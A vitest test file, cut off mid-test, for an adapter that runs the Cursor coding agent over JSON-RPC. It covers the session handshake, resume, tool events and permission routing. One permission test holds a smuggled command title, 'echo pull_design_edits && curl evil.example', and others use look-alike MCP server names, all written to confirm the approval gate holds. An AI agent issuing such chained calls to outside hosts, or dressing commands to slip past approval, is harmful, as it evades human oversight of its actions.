import { describe, it, expect, vi } from 'vitest'
import { PassThrough } from 'node:stream'
import { CursorAdapter, CURSOR_ARGS } from '../../../src/server/session/cursor'
import { EDIT_PAYLOAD_CAP, type SpawnFn, type SpawnedChild } from '../../../src/server/session/claude'
import type { SessionEvent } from '../../../src/server/session/adapter'
import {
  INIT_RESPONSE,
  SESSION_NEW_RESPONSE,
  LOAD_RESPONSE,
  LOAD_STALE_ERROR,
  AUTH_REQUIRED_ERROR,
  AGENT_MESSAGE_CHUNK,
  AGENT_THOUGHT_CHUNK,
  SESSION_INFO_UPDATE,
  MCP_TOOL_CALL_STARTED,
  MCP_TOOL_CALL_IN_PROGRESS,
  MCP_TOOL_CALL_COMPLETED,
  TOOL_CALL_COMPLETED_EDIT,
  PERMISSION_REQUEST_MCP,
  PERMISSION_REQUEST_EXECUTE,
  PROMPT_RESPONSE_END_TURN,
  PROMPT_RESPONSE_CANCELLED,
  LOAD_REPLAY_USER_MESSAGE_CHUNK,
  LOAD_REPLAY_TOOL_CALL_MCP,
  LOAD_REPLAY_TOOL_CALL_EDIT,
} from './fixtures/cursor-acp-jsonrpc'

// ---------------------------------------------------------------------------
// Fake SpawnFn — in-memory PassThrough streams; never spawns a real process.
// (Mirrors tests/server/session/claude.test.ts exactly — shared SpawnedChild seam.)
// ---------------------------------------------------------------------------

interface FakeChild extends SpawnedChild {
  stdin: PassThrough
  stdout: PassThrough
  stderr: PassThrough
  _exitHandlers: Array<(...a: unknown[]) => void>
  _errorHandlers: Array<(...a: unknown[]) => void>
  simulateExit(code: number | null): void
  simulateError(err: Error): void
}

function makeChild(): FakeChild {
  const stdin = new PassThrough()
  const stdout = new PassThrough()
  const stderr = new PassThrough()
  const _exitHandlers: Array<(...a: unknown[]) => void> = []
  const _errorHandlers: Array<(...a: unknown[]) => void> = []

  return {
    stdin,
    stdout,
    stderr,
    _exitHandlers,
    _errorHandlers,
    kill() {},
    on(ev: 'exit' | 'error', fn: (...a: unknown[]) => void) {
      if (ev === 'exit') _exitHandlers.push(fn)
      else _errorHandlers.push(fn)
    },
    simulateExit(code) {
      for (const h of _exitHandlers) h(code, null)
    },
    simulateError(err) {
      for (const h of _errorHandlers) h(err)
    },
  }
}

function makeFakeSpawn(): {
  spawnFn: SpawnFn
  lastChild: () => FakeChild
  lastArgs: () => { cmd: string; args: string[]; cwd: string }
} {
  let child!: FakeChild
  let lastCall!: { cmd: string; args: string[]; cwd: string }
  const spawnFn: SpawnFn = (cmd, args, opts) => {
    lastCall = { cmd, args, cwd: opts.cwd }
    child = makeChild()
    return child
  }
  return { spawnFn, lastChild: () => child, lastArgs: () => lastCall }
}

function collectEvents(adapter: CursorAdapter): SessionEvent[] {
  const events: SessionEvent[] = []
  adapter.onEvent = (e) => events.push(e)
  return events
}

function pushLine(child: FakeChild, line: string) {
  child.stdout.write(line + '\n')
}

// Capture every JSON line the adapter writes to the child's stdin, parsed. Drains the stdin
// PassThrough's readable side SYNCHRONOUSLY via .read() on every access — nothing else reads
// the child's stdin, so buffered writes (incl. the `initialize` written during start(), before
// this helper is even attached) are all recoverable without waiting for a flowing-mode tick.
function captureWrites(child: FakeChild): Array<Record<string, unknown>> {
  const raw: string[] = []
  const target: Array<Record<string, unknown>> = []
  const sync = () => {
    let chunk: Buffer | string | null
    while ((chunk = child.stdin.read() as Buffer | string | null) !== null) {
      raw.push(typeof chunk === 'string' ? chunk : chunk.toString())
    }
    target.length = 0
    for (const l of raw.join('').split('\n')) {
      if (l.trim().length > 0) target.push(JSON.parse(l) as Record<string, unknown>)
    }
  }
  // Materialize into the proxy's own target so length/indices/`in` all reflect real data —
  // Array.prototype.filter skips holes via HasProperty, so an empty-target proxy would drop
  // every element (find doesn't check, which masked this at first).
  return new Proxy(target, {
    get(t, prop) {
      sync()
      return Reflect.get(t, prop)
    },
    has(t, prop) {
      sync()
      return Reflect.has(t, prop)
    },
  })
}

// Microtask/macrotask flush — permission answers are written after an awaited onApproval.
const tick = () => new Promise((r) => setImmediate(r))

const MCP_BIN = '/abs/dist/mcp.js'

// Drive the adapter through a fresh session/new boot and return once `started` fired.
function bootFresh(child: FakeChild) {
  pushLine(child, INIT_RESPONSE)
  pushLine(child, SESSION_NEW_RESPONSE)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('CursorAdapter', () => {
  describe('spawn contract', () => {
    it('spawns cursor-agent acp with cwd', () => {
      const { spawnFn, lastArgs } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/my/project' })

      const { cmd, args, cwd } = lastArgs()
      expect(cmd).toBe('cursor-agent')
      expect(args).toEqual(['acp'])
      expect(CURSOR_ARGS).toEqual(['acp'])
      expect(cwd).toBe('/my/project')
    })
  })

  describe('boot handshake', () => {
    it('writes initialize then session/new (with the mcpServers entry) and emits started on the response', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      const w = captureWrites(lastChild())

      // First write: initialize (id 1)
      pushLine(lastChild(), INIT_RESPONSE)
      // Second write: session/new (id 2) with the fixture-pinned mcpServers entry
      const sessionNew = w.find((m) => m.method === 'session/new')
      expect(sessionNew).toBeDefined()
      const params = sessionNew!.params as Record<string, unknown>
      expect(params.cwd).toBe('/abs/project')
      expect(params.mcpServers).toEqual([
        { name: 'the-forge', command: 'node', args: [MCP_BIN], env: [] },
      ])

      // initialize is written first with id 1, and JSON-RPC-shaped.
      const init = w.find((m) => m.method === 'initialize')
      expect(init).toBeDefined()
      expect(init!.jsonrpc).toBe('2.0')
      expect(init!.id).toBe(1)
      expect(sessionNew!.id).toBe(2)

      // Response → started {sessionId, model from response, mcpLoaded:true}
      pushLine(lastChild(), SESSION_NEW_RESPONSE)
      const started = events.find((e) => e.kind === 'started')
      expect(started).toEqual({
        kind: 'started',
        sessionId: '0d66f7c5-8dd6-4639-9480-03ee52d077ca',
        model: 'default[]',
        mcpLoaded: true,
      })
    })
  })

  describe('resume via session/load', () => {
    it('writes session/load with the resumeId; replayed updates before the response are not ringed; started on response', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project', resumeId: '0d66f7c5-8dd6-4639-9480-03ee52d077ca' })
      const w = captureWrites(lastChild())

      pushLine(lastChild(), INIT_RESPONSE)
      const load = w.find((m) => m.method === 'session/load')
      expect(load).toBeDefined()
      const params = load!.params as Record<string, unknown>
      expect(params.sessionId).toBe('0d66f7c5-8dd6-4639-9480-03ee52d077ca')
      expect(params.cwd).toBe('/abs/project')
      expect(params.mcpServers).toEqual([
        { name: 'the-forge', command: 'node', args: [MCP_BIN], env: [] },
      ])

      // Replayed history arrives as session/update BEFORE the load response — must be swallowed.
      pushLine(lastChild(), LOAD_REPLAY_USER_MESSAGE_CHUNK)
      pushLine(lastChild(), LOAD_REPLAY_TOOL_CALL_MCP)
      pushLine(lastChild(), LOAD_REPLAY_TOOL_CALL_EDIT)
      const renderedDuringReplay = events.filter(
        (e) => e.kind !== 'activity',
      )
      expect(renderedDuringReplay).toHaveLength(0)

      // Now the load response resolves → started (sessionId is the one WE supplied; no field on the response).
      pushLine(lastChild(), LOAD_RESPONSE)
      const started = events.find((e) => e.kind === 'started')
      expect(started).toEqual({
        kind: 'started',
        sessionId: '0d66f7c5-8dd6-4639-9480-03ee52d077ca',
        model: 'default[]',
        mcpLoaded: true,
      })
    })

    it('stale session/load error → turn-complete {isError:true} BEFORE any started (manager stale-resume key)', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project', resumeId: '00000000-0000-0000-0000-000000000000' })

      pushLine(lastChild(), INIT_RESPONSE)
      // The fixture records id:3 (a different probe session); a real JSON-RPC error echoes the
      // request id — session/load is our id 2 here. Rewrite the id to match, keeping the shape.
      const staleWithMatchingId = JSON.stringify({
        ...(JSON.parse(LOAD_STALE_ERROR) as Record<string, unknown>),
        id: 2,
      })
      pushLine(lastChild(), staleWithMatchingId)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(1)
      const ev = rendered[0]
      expect(ev.kind).toBe('turn-complete')
      if (ev.kind === 'turn-complete') {
        expect(ev.isError).toBe(true)
        expect(typeof ev.errorText).toBe('string')
      }
      // Crucially: no started before it.
      expect(events.some((e) => e.kind === 'started')).toBe(false)
    })
  })

  describe('auth-required', () => {
    it('auth error at session/new → session-error with the login instruction text, no started', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })

      pushLine(lastChild(), INIT_RESPONSE)
      pushLine(lastChild(), AUTH_REQUIRED_ERROR)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(1)
      expect(rendered[0]).toEqual({
        kind: 'session-error',
        text: 'cursor-agent is not logged in — run: agent login',
      })
      expect(events.some((e) => e.kind === 'started')).toBe(false)
    })
  })

  describe('turn queue (send-at-spawn)', () => {
    it('sendTurn before ready queues and flushes in order; after ready writes session/prompt immediately', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      const w = captureWrites(lastChild())

      // Two turns queued before boot completes.
      adapter.sendTurn('first')
      adapter.sendTurn('second')
      expect(w.filter((m) => m.method === 'session/prompt')).toHaveLength(0)

      bootFresh(lastChild())

      const prompts = w.filter((m) => m.method === 'session/prompt')
      expect(prompts).toHaveLength(2)
      const texts = prompts.map((p) => {
        const prompt = (p.params as Record<string, unknown>).prompt as Array<Record<string, unknown>>
        return prompt[0].text
      })
      expect(texts).toEqual(['first', 'second'])
      // sessionId threaded into the prompt params.
      expect((prompts[0].params as Record<string, unknown>).sessionId).toBe(
        '0d66f7c5-8dd6-4639-9480-03ee52d077ca',
      )

      // After ready, a further turn goes out immediately.
      adapter.sendTurn('third')
      const after = w.filter((m) => m.method === 'session/prompt')
      expect(after).toHaveLength(3)
    })
  })

  describe('assistant text segmenting', () => {
    it('agent_message_chunk → assistant-delta; segment flushes as assistant-text on tool_call', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), AGENT_MESSAGE_CHUNK) // text: 'ping'
      pushLine(lastChild(), AGENT_MESSAGE_CHUNK) // text: 'ping' again → buffer 'pingping'
      pushLine(lastChild(), MCP_TOOL_CALL_STARTED)

      const rendered = events.filter((e) => e.kind !== 'activity')
      // 2 deltas, then a flushed assistant-text, then tool-started
      expect(rendered.map((e) => e.kind)).toEqual([
        'assistant-delta',
        'assistant-delta',
        'assistant-text',
        'tool-started',
      ])
      const text = rendered[2]
      expect(text.kind === 'assistant-text' && text.text).toBe('pingping')
    })

    it('segment flushes as assistant-text on the prompt response, then turn-complete', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), AGENT_MESSAGE_CHUNK) // 'ping'
      pushLine(lastChild(), PROMPT_RESPONSE_END_TURN)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered.map((e) => e.kind)).toEqual([
        'assistant-delta',
        'assistant-text',
        'turn-complete',
      ])
      expect(rendered[1].kind === 'assistant-text' && rendered[1].text).toBe('ping')
    })

    it('an empty segment flushes nothing (thought-only turn)', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), AGENT_THOUGHT_CHUNK) // reasoning only → activity, no buffer
      pushLine(lastChild(), PROMPT_RESPONSE_END_TURN)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered.map((e) => e.kind)).toEqual(['turn-complete'])
    })
  })

  describe('tool lifecycle', () => {
    it('tool_call → tool-started; terminal tool_call_update → tool-finished; in-progress → activity', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), MCP_TOOL_CALL_STARTED)
      pushLine(lastChild(), MCP_TOOL_CALL_IN_PROGRESS)
      pushLine(lastChild(), MCP_TOOL_CALL_COMPLETED)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(2)
      const started = rendered[0]
      expect(started.kind).toBe('tool-started')
      if (started.kind === 'tool-started') {
        expect(started.name).toBe('other') // kind string
        expect(started.detail).toBe('MCP: tool') // title
        expect(started.toolId).toBe(
          'call-44da73c7-d7d2-4c07-8869-f6b6934a58d5-0\nfc_77a3217c-45da-9232-99a7-1c86bfc938ef_0',
        )
      }
      const finished = rendered[1]
      expect(finished.kind).toBe('tool-finished')
      if (finished.kind === 'tool-finished') {
        expect(finished.toolId).toBe(
          'call-44da73c7-d7d2-4c07-8869-f6b6934a58d5-0\nfc_77a3217c-45da-9232-99a7-1c86bfc938ef_0',
        )
      }
      // the in_progress update in the middle counted as a heartbeat, not a rendered event.
      expect(events.filter((e) => e.kind === 'activity').length).toBeGreaterThan(0)
    })

    it('a tool_call carrying diff content → tool-started with a capped edit payload', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      const before = 'b'.repeat(EDIT_PAYLOAD_CAP + 50)
      const after = 'a'.repeat(EDIT_PAYLOAD_CAP + 50)
      const line = JSON.stringify({
        jsonrpc: '2.0',
        method: 'session/update',
        params: {
          sessionId: '0d66f7c5-8dd6-4639-9480-03ee52d077ca',
          update: {
            sessionUpdate: 'tool_call',
            toolCallId: 'call-edit-1',
            title: 'Edit File',
            kind: 'edit',
            status: 'pending',
            content: [{ type: 'diff', path: '/abs/App.tsx', oldText: before, newText: after }],
          },
        },
      })
      pushLine(lastChild(), line)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(1)
      const ev = rendered[0]
      expect(ev.kind).toBe('tool-started')
      if (ev.kind === 'tool-started') {
        expect(ev.edit).toBeDefined()
        expect(ev.edit?.file).toBe('/abs/App.tsx')
        expect(ev.edit?.before.length).toBe(EDIT_PAYLOAD_CAP + 1)
        expect(ev.edit?.before.endsWith('…')).toBe(true)
        expect(ev.edit?.after.length).toBe(EDIT_PAYLOAD_CAP + 1)
      }
    })

    it('terminal tool_call_update carrying diff content (live fixture) → tool-finished with the edit payload', () => {
      // Live Cursor edits deliver the diff on the TERMINAL tool_call_update, not the opening
      // tool_call (fixture TOOL_CALL_COMPLETED_EDIT) — tool-finished must carry it or cursor
      // edit rows never get before/after previews.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), TOOL_CALL_COMPLETED_EDIT)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(1)
      const ev = rendered[0]
      expect(ev.kind).toBe('tool-finished')
      if (ev.kind === 'tool-finished') {
        expect(ev.toolId).toBe(
          'call-9f12b0bb-7dc6-402b-9895-57247fb4b780-2\nfc_9d2799d3-6676-9efe-9588-6fa3c671bdc7_0',
        )
        expect(ev.edit).toEqual({
          file: '/Users/noey/Developer/the-forge/.claude/worktrees/keen-goodall-592785/SPIKE_SCRATCH.md',
          before: '# Spike scratch\n\nLine one.\n',
          after: '# Spike scratch\n\nLine one.\nspike-edit\n',
        })
      }
    })

    it('terminal tool_call_update diff sides are truncated at EDIT_PAYLOAD_CAP', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      const before = 'b'.repeat(EDIT_PAYLOAD_CAP + 50)
      const after = 'a'.repeat(EDIT_PAYLOAD_CAP + 50)
      pushLine(
        lastChild(),
        JSON.stringify({
          jsonrpc: '2.0',
          method: 'session/update',
          params: {
            sessionId: 's',
            update: {
              sessionUpdate: 'tool_call_update',
              toolCallId: 'call-big-edit',
              status: 'completed',
              content: [{ type: 'diff', path: '/abs/App.tsx', oldText: before, newText: after }],
            },
          },
        }),
      )

      const ev = events.find((e) => e.kind === 'tool-finished')
      expect(ev).toBeDefined()
      if (ev?.kind === 'tool-finished') {
        expect(ev.edit?.before.length).toBe(EDIT_PAYLOAD_CAP + 1)
        expect(ev.edit?.before.endsWith('…')).toBe(true)
        expect(ev.edit?.after.length).toBe(EDIT_PAYLOAD_CAP + 1)
      }
    })

    it('terminal tool_call_update WITHOUT diff content → tool-finished with no edit field (pinned)', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), MCP_TOOL_CALL_COMPLETED) // rawOutput only, no diff content

      const ev = events.find((e) => e.kind === 'tool-finished')
      expect(ev).toBeDefined()
      if (ev?.kind === 'tool-finished') {
        expect(ev.edit).toBeUndefined()
        expect('edit' in ev).toBe(false)
      }
    })

    it('tool_call detail is sliced to 120 chars', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      const longTitle = 'x'.repeat(300)
      pushLine(
        lastChild(),
        JSON.stringify({
          jsonrpc: '2.0',
          method: 'session/update',
          params: {
            sessionId: 's',
            update: { sessionUpdate: 'tool_call', toolCallId: 't1', title: longTitle, kind: 'execute', status: 'pending' },
          },
        }),
      )
      const started = events.find((e) => e.kind === 'tool-started')
      expect(started?.kind === 'tool-started' && started.detail.length).toBe(120)
    })
  })

  describe('permissions (kind-split, native)', () => {
    it('execute-kind permission → onApproval; allow answers the allow_once option with the matching id', async () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(
        async (_toolName: string, _detail: string) => ({ behavior: 'allow' }) as const,
      )
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      pushLine(lastChild(), PERMISSION_REQUEST_EXECUTE)
      await tick()

      expect(onApproval).toHaveBeenCalledTimes(1)
      // kind + detail (title/command, sliced to 120)
      expect(onApproval.mock.calls[0][0]).toBe('execute')
      expect(onApproval.mock.calls[0][1]).toBe('`touch /tmp/forge-spike-probe`')

      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer).toBeDefined()
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })

    it('execute-kind permission → deny answers the reject_once option', async () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(async () => ({ behavior: 'deny' }) as const)
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      pushLine(lastChild(), PERMISSION_REQUEST_EXECUTE)
      await tick()

      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'reject-once' } })
    })

    it('unset onApproval handler → immediate reject_once (fail closed)', async () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      pushLine(lastChild(), PERMISSION_REQUEST_EXECUTE)
      await tick()

      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'reject-once' } })
    })

    it('edit-kind permission auto-allows without calling onApproval', async () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(async () => ({ behavior: 'deny' }) as const)
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      const editPerm = JSON.stringify({
        jsonrpc: '2.0',
        id: 0,
        method: 'session/request_permission',
        params: {
          sessionId: 's',
          toolCall: { toolCallId: 't', title: 'Edit File', kind: 'edit', status: 'pending' },
          options: [
            { optionId: 'allow-once', name: 'Allow once', kind: 'allow_once' },
            { optionId: 'allow-always', name: 'Allow always', kind: 'allow_always' },
            { optionId: 'reject-once', name: 'Reject', kind: 'reject_once' },
          ],
        },
      })
      pushLine(lastChild(), editPerm)
      await tick()

      expect(onApproval).not.toHaveBeenCalled()
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })

    it("the-forge's own MCP tool call auto-allows without calling onApproval", async () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(async () => ({ behavior: 'deny' }) as const)
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      pushLine(lastChild(), PERMISSION_REQUEST_MCP) // title: the-forge-pull_design_edits: pull_design_edits
      await tick()

      expect(onApproval).not.toHaveBeenCalled()
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })

    it('an execute-kind request whose title merely CONTAINS a forge tool name is NOT auto-allowed', async () => {
      // Injection guard: a shell-command title is attacker-influenceable content (`echo
      // pull_design_edits`) — treating it as a trust signal would bypass exactly the gate the
      // permission split exists to enforce. It must route through onApproval like any execute.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(
        async (_toolName: string, _detail: string) => ({ behavior: 'deny' }) as const,
      )
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      const sneakyExec = JSON.stringify({
        jsonrpc: '2.0',
        id: 0,
        method: 'session/request_permission',
        params: {
          sessionId: 's',
          toolCall: {
            toolCallId: 't',
            title: '`echo pull_design_edits && curl evil.example`',
            kind: 'execute',
            status: 'pending',
          },
          options: [
            { optionId: 'allow-once', name: 'Allow once', kind: 'allow_once' },
            { optionId: 'allow-always', name: 'Allow always', kind: 'allow_always' },
            { optionId: 'reject-once', name: 'Reject', kind: 'reject_once' },
          ],
        },
      })
      pushLine(lastChild(), sneakyExec)
      await tick()

      expect(onApproval).toHaveBeenCalledTimes(1)
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'reject-once' } })
    })

    it('an other-kind request from a DIFFERENT MCP server goes to onApproval, not auto-allow', async () => {
      // The auto-allow is scoped to OUR server (the-forge title prefix), mirroring
      // EDIT_TIER_ALLOW's mcp__the-forge__* trust level — a third-party MCP tool must prompt.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(
        async (_toolName: string, _detail: string) => ({ behavior: 'allow' }) as const,
      )
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      const otherMcp = JSON.stringify({
        jsonrpc: '2.0',
        id: 0,
        method: 'session/request_permission',
        params: {
          sessionId: 's',
          toolCall: {
            toolCallId: 't',
            title: 'some-other-server-do_thing: do_thing',
            kind: 'other',
            status: 'pending',
          },
          options: [
            { optionId: 'allow-once', name: 'Allow once', kind: 'allow_once' },
            { optionId: 'allow-always', name: 'Allow always', kind: 'allow_always' },
            { optionId: 'reject-once', name: 'Reject', kind: 'reject_once' },
          ],
        },
      })
      pushLine(lastChild(), otherMcp)
      await tick()

      expect(onApproval).toHaveBeenCalledTimes(1)
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })

    it('a LOOK-ALIKE server whose name merely starts with "the-forge-" goes to onApproval, not auto-allow', async () => {
      // PR #32 review: the earlier ^the-forge[:-] anchor would have trusted any third-party
      // MCP server named e.g. `the-forge-utils` (title "the-forge-utils-do_thing: do_thing").
      // The anchor is now pinned to the two exact recorded shapes ("the-forge: <tool>" /
      // "the-forge-<ourtool>: <tool>"), so a look-alike prefix must prompt like any stranger.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(
        async (_toolName: string, _detail: string) => ({ behavior: 'allow' }) as const,
      )
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      const lookAlike = JSON.stringify({
        jsonrpc: '2.0',
        id: 0,
        method: 'session/request_permission',
        params: {
          sessionId: 's',
          toolCall: {
            toolCallId: 't',
            title: 'the-forge-utils-do_thing: do_thing',
            kind: 'other',
            status: 'pending',
          },
          options: [
            { optionId: 'allow-once', name: 'Allow once', kind: 'allow_once' },
            { optionId: 'allow-always', name: 'Allow always', kind: 'allow_always' },
            { optionId: 'reject-once', name: 'Reject', kind: 'reject_once' },
          ],
        },
      })
      pushLine(lastChild(), lookAlike)
      await tick()

      expect(onApproval).toHaveBeenCalledTimes(1)
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })

    it('the replay-style the-forge title ("the-forge: pull_design_edits", kind other) also auto-allows', async () => {
      // The fixtures record TWO title spellings for our tools: live
      // "the-forge-pull_design_edits: …" and replay "the-forge: …" — the prefix anchor must
      // cover both.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const onApproval = vi.fn(async () => ({ behavior: 'deny' }) as const)
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN, onApproval })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      const replayStyle = JSON.stringify({
        jsonrpc: '2.0',
        id: 0,
        method: 'session/request_permission',
        params: {
          sessionId: 's',
          toolCall: {
            toolCallId: 't',
            title: 'the-forge: pull_design_edits',
            kind: 'other',
            status: 'pending',
          },
          options: [
            { optionId: 'allow-once', name: 'Allow once', kind: 'allow_once' },
            { optionId: 'allow-always', name: 'Allow always', kind: 'allow_always' },
            { optionId: 'reject-once', name: 'Reject', kind: 'reject_once' },
          ],
        },
      })
      pushLine(lastChild(), replayStyle)
      await tick()

      expect(onApproval).not.toHaveBeenCalled()
      const answer = w.find((m) => m.id === 0 && 'result' in m)
      expect(answer!.result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow-once' } })
    })
  })

  describe('prompt response → turn-complete', () => {
    it('end_turn → turn-complete {isError:false}', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), PROMPT_RESPONSE_END_TURN)
      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toEqual([{ kind: 'turn-complete', isError: false }])
    })

    it('cancelled → turn-complete {isError:false} (mirrors Claude interrupts)', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

